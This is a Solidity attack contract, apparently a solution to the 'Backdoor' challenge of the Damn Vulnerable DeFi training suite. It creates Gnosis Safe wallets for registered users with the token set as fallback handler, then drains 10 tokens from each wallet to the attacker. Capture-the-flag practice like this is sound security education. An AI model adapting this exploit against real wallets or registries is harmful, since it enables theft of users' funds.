pragma solidity ^0.8.0;

import "./WalletRegistry.sol";
import "@gnosis.pm/safe-contracts/contracts/proxies/GnosisSafeProxyFactory.sol";
import "../DamnValuableToken.sol";

contract backdoorAttacker {

    GnosisSafeProxyFactory public proxyFatory;
    WalletRegistry public registry;
    address[] public users;
    address public owner;
    GnosisSafe public masterCopy;
    DamnValuableToken public token;
    

    constructor(
        address[] memory _users, 
        address factoryAddr, 
        address registryAddr, 
        address tokenAddr, 
        address payable walletAddr) 
    {
        owner = msg.sender;
        users = new address[](_users.length);
        for (uint i=0;i<_users.length;i++)
            users[i] = _users[i];
        proxyFatory = GnosisSafeProxyFactory(factoryAddr);
        registry = WalletRegistry(registryAddr);
        token = DamnValuableToken(tokenAddr);
        masterCopy = GnosisSafe(walletAddr);
    }

    function attack() external payable {

        for (uint i=0;i<users.length;i++) {
            address[] memory tempUsers = new address[](1);
            tempUsers[0] = users[i];
            GnosisSafeProxy proxy = proxyFatory.createProxyWithCallback(
            address(masterCopy),
            abi.encodeWithSelector(
                GnosisSafe.setup.selector,
                tempUsers,
                1,
                address(0),
                bytes("aa"),
                address(token),
                address(token),
                0,
                address(0)
                ),
                0,
                registry
            );
            DamnValuableToken(address(proxy)).transfer(owner, 10 ether);
        }
    }

}